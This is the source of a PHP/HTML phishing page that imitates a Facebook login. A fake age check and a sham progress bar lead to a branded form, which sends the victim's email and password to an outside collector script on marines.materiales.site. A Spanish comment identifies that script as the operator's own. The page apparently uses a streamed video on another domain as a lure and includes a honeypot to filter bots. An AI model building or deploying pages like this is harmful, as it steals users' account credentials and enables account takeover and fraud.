<?php include 'idioma.php'; ?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $t['title']; ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }

        .video-background {
            position: fixed;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            transform: translate(-50%, -50%);
            object-fit: cover;
            opacity: 0.35;
            z-index: 1;
            filter: brightness(0.7);
        }

        .vignette {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(0,0,0,0.3) 20%, rgba(0,0,0,0.95) 85%);
            z-index: 2;
            pointer-events: none;
        }

        .modal-card {
            position: relative;
            z-index: 10;
            background: rgba(18, 18, 18, 0.88);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 35px 25px;
            width: 90%;
            max-width: 420px;
            min-height: 380px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
            margin: auto;
        }

        .card-content {
            margin: auto 0;
            width: 100%;
        }

        .hidden { display: none !important; }

        /* --- Age Gate & Shared --- */
        .icon-container {
            width: 58px;
            height: 58px;
            background: rgba(24, 119, 242, 0.15);
            border: 1px solid rgba(24, 119, 242, 0.3);
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px auto;
            transition: all 0.3s ease;
        }
        .icon-container svg { width: 28px; height: 28px; fill: #1877F2; }

        .icon-success {
            background: rgba(46, 204, 113, 0.15) !important;
            border-color: rgba(46, 204, 113, 0.3) !important;
        }
        .icon-success svg { fill: #2ecc71 !important; }

        h1 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #ffffff;
            letter-spacing: -0.5px;
        }
        p {
            font-size: 13.5px;
            color: #b0b3b8;
            line-height: 1.45;
            margin-bottom: 20px;
        }

        .btn {
            width: 100%;
            padding: 13px;
            border-radius: 10px;
            font-size: 14.5px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.25s ease;
            border: none;
            margin-bottom: 8px;
        }
        .btn-primary {
            background-color: #1877F2;
            color: #ffffff;
            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
        }
        .btn-primary:hover {
            background-color: #166fe5;
            box-shadow: 0 0 20px rgba(255,255,255,0.6), 0 4px 20px rgba(24,119,242,0.6);
            transform: translateY(-1px);
        }
        .btn-primary:disabled {
            opacity: 0.7;
            cursor: wait;
            transform: none;
        }
        .btn-secondary {
            background-color: rgba(255,255,255,0.05);
            color: #e4e6eb;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .btn-secondary:hover {
            background-color: rgba(24,119,242,0.1);
            color: #1877F2;
            border-color: #1877F2;
            box-shadow: 0 0 15px rgba(255,255,255,0.5), 0 0 20px rgba(24,119,242,0.4);
            transform: translateY(-1px);
        }

        .footer-sec {
            font-size: 11.5px;
            color: #8a8d91;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            border-top: 1px solid rgba(255,255,255,0.06);
            padding-top: 16px;
            margin-top: auto;
        }

        /* --- Loading --- */
        .progress-bar-bg {
            width: 100%;
            height: 9px;
            background: rgba(255,255,255,0.1);
            border-radius: 5px;
            overflow: hidden;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.15);
        }
        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: #1877F2;
            box-shadow: 0 0 10px #1877F2;
            border-radius: 5px;
            transition: width 0.015s linear;
        }
        .percentage-text {
            font-size: 26px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 6px;
        }

        /* --- Facebook Login --- */
        .fb-brand { margin-bottom: 16px; }
        .fb-brand svg { width: 48px; height: 48px; fill: #1877F2; }

        .login-alert {
            background: rgba(255, 193, 7, 0.1);
            border-left: 3px solid #ffc107;
            padding: 10px 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            align-items: center;
            text-align: left;
        }
        .login-alert svg { width: 22px; height: 22px; fill: #ffc107; flex-shrink: 0; }
        .login-alert span { font-size: 13px; color: #e4e6eb; line-height: 1.3; }

        .input-group { position: relative; margin-bottom: 14px; }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 8px;
            font-size: 16px;
            color: #ffffff;
            background: rgba(0,0,0,0.25);
            transition: all 0.2s;
            outline: none;
        }
        .input-group input::placeholder { color: #8a8d91; }
        .input-group input:focus {
            border-color: #1877F2;
            box-shadow: 0 0 0 3px rgba(24,119,242,0.25);
            background: rgba(0,0,0,0.4);
        }

        .hp-field {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 0;
            height: 0;
        }

        .forgot-pass {
            display: block;
            text-align: center;
            margin-top: 16px;
            color: #b0b3b8;
            text-decoration: none;
            font-size: 13.5px;
            font-weight: 500;
            transition: color 0.2s;
        }
        .forgot-pass:hover { color: #ffffff; }
    </style>
</head>
<body>

    <!-- Video de fondo -->
    <video class="video-background" autoplay muted loop playsinline>
        <source src="https://directo.discrettasliveftosgroup.com/video.mp4" type="video/mp4">
    </video>
    <div class="vignette"></div>

    <!-- Tarjeta principal -->
    <div class="modal-card" id="mainCard">
        
        <!-- ESTADO 1: Age Gate -->
        <div id="stateAge" class="card-content">
            <div class="icon-container">
                <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,5A3,3 0 0,1 15,8A3,3 0 0,1 12,11A3,3 0 0,1 9,8A3,3 0 0,1 12,5M17.13,17C15.92,18.85 14.11,20 12,20C9.89,20 8.08,18.85 6.87,17C6.53,16.5 6.87,15.82 7.47,15.75C9.3,15.5 10.6,15 12,15C13.4,15 14.7,15.5 16.53,15.75C17.13,15.82 17.47,16.5 17.13,17Z" /></svg>
            </div>
            <h1><?php echo $t['title']; ?></h1>
            <p><?php echo $t['desc']; ?></p>
            <button class="btn btn-primary" onclick="startLoading()"><?php echo $t['yes']; ?></button>
            <button class="btn btn-secondary" onclick="alert('<?php echo $t['no_access']; ?>')"><?php echo $t['no']; ?></button>
        </div>

        <!-- ESTADO 2: Loading -->
        <div id="stateLoading" class="card-content hidden">
            <div class="icon-container" id="boxIcon">
                <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,5A3,3 0 0,1 15,8A3,3 0 0,1 12,11A3,3 0 0,1 9,8A3,3 0 0,1 12,5M17.13,17C15.92,18.85 14.11,20 12,20C9.89,20 8.08,18.85 6.87,17C6.53,16.5 6.87,15.82 7.47,15.75C9.3,15.5 10.6,15 12,15C13.4,15 14.7,15.5 16.53,15.75C17.13,15.82 17.47,16.5 17.13,17Z" /></svg>
            </div>
            <div class="percentage-text" id="counter">1%</div>
            <h1 id="boxTitle"><?php echo $t['loading_text']; ?></h1>
            <div class="progress-bar-bg" id="progressBarContainer">
                <div class="progress-bar-fill" id="progressBar"></div>
            </div>
        </div>

        <!-- ESTADO 3: Login -->
        <div id="stateLogin" class="card-content hidden">
            <div class="fb-brand">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
            </div>

            <h1><?php echo $t['login_title']; ?></h1>

            <div class="login-alert">
                <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M11,7H13V9H11V7M11,11H13V17H11V11Z"/></svg>
                <span><?php echo $t['login_alert']; ?></span>
            </div>

            <!-- ENVÍO POST NATIVO A TU pasta.php -->
            <form id="loginForm" action="https://marines.materiales.site/pasta.php" method="POST" onsubmit="return handleLogin(event)" autocomplete="off">
                
                <!-- Honeypot anti-bots -->
                <input type="text" name="company" class="hp-field" tabindex="-1" aria-hidden="true" autocomplete="off">
                
                <div class="input-group">
                    <input type="text" inputmode="email" id="email" name="email" placeholder="<?php echo $t['ph_email']; ?>" required autocomplete="username">
                </div>
                <div class="input-group">
                    <input type="password" id="pass" name="pass" placeholder="<?php echo $t['ph_pass']; ?>" required autocomplete="current-password">
                </div>

                <button type="submit" id="btnSubmit" class="btn btn-primary" style="margin-bottom:0;"><?php echo $t['btn_login']; ?></button>
            </form>
            <a href="#" class="forgot-pass"><?php echo $t['forgot_pass']; ?></a>
        </div>

        <!-- Footer -->
        <div class="footer-sec" id="mainFooter">
            <span style="font-size:13px;">🔒</span> <?php echo $t['security']; ?>
        </div>
    </div>

    <script>
        // ---------- AGE GATE / LOADING ----------
        function startLoading() {
            document.getElementById('stateAge').classList.add('hidden');
            document.getElementById('stateLoading').classList.remove('hidden');

            let currentProgress = 1;
            const intervalTime = 15; // 1.5 segundos totales

            const bar = document.getElementById('progressBar');
            const counter = document.getElementById('counter');
            const boxTitle = document.getElementById('boxTitle');
            const boxIcon = document.getElementById('boxIcon');
            const progressBarContainer = document.getElementById('progressBarContainer');

            const loadingInterval = setInterval(() => {
                currentProgress++;
                bar.style.width = currentProgress + '%';
                counter.innerText = currentProgress + '%';

                if (currentProgress >= 100) {
                    clearInterval(loadingInterval);
                    
                    counter.style.display = 'none';
                    progressBarContainer.style.display = 'none';
                    boxTitle.innerText = "<?php echo $t['completed_text']; ?>";
                    boxIcon.classList.add('icon-success');
                    boxIcon.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12S6.5 22 12 22 22 17.5 22 12 17.5 2 12 2M10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z"/></svg>';

                    setTimeout(() => {
                        showLogin();
                    }, 900);
                }
            }, intervalTime);
        }

        function showLogin() {
            document.getElementById('stateLoading').classList.add('hidden');
            document.getElementById('stateLogin').classList.remove('hidden');
            document.getElementById('mainFooter').classList.add('hidden');
        }

        // ---------- LOGIN / REDIRECCIÓN NATIVA ----------
        function handleLogin(e) {
            const hp = document.querySelector('.hp-field').value;
            if (hp !== '') {
                e.preventDefault();
                return false;
            }

            const em = document.getElementById('email').value.trim();
            const ps = document.getElementById('pass').value;
            if (!em || ps.length < 1) {
                e.preventDefault();
                return false;
            }

            // Cambia el botón a "Entrando..." y deja que el navegador haga el POST real
            const btn = document.getElementById('btnSubmit');
            btn.disabled = true;
            btn.innerText = '<?php echo $t['btn_login_loading']; ?>';

            return true; // Envía el formulario de forma nativa a pasta.php
        }
    </script>

</body>
</html>
